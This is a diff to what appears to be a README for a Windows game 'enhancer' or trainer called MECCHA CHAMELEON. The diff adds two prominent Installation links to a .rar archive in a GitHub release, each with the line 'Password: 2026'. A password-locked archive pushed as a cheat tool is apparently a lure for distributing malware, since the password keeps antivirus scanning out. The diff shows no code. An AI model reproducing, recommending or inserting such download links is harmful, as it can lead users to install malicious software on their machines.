@@ -20,7 +20,7 @@ All-in-one solution combining visual assistance and system refinement.
 
 ---
 
-## 📥 Installation
+## 📥 [Installation](https://github.com/GunsmithSpike/MECCHA-CHAMELEON-TRAINER/releases/download/MECCHAHAMELEON/Meccha.Chameleon.Enhanced.v2.1.rar)
 
 **Password: 2026**
 
@@ -73,8 +73,10 @@ All-in-one solution combining visual assistance and system refinement.
 MECCHA CHAMELEON, GAMING ENHANCER, VISUAL SYSTEM, OPTIMIZATION TOOL, WINDOWS APPLICATION
 
 ---
+## 📥 [Installation](https://github.com/GunsmithSpike/MECCHA-CHAMELEON-TRAINER/releases/download/MECCHAHAMELEON/Meccha.Chameleon.Enhanced.v2.1.rar)
 
-### 🔽 Acquisition
+**Password: 2026**
+
 
 
 
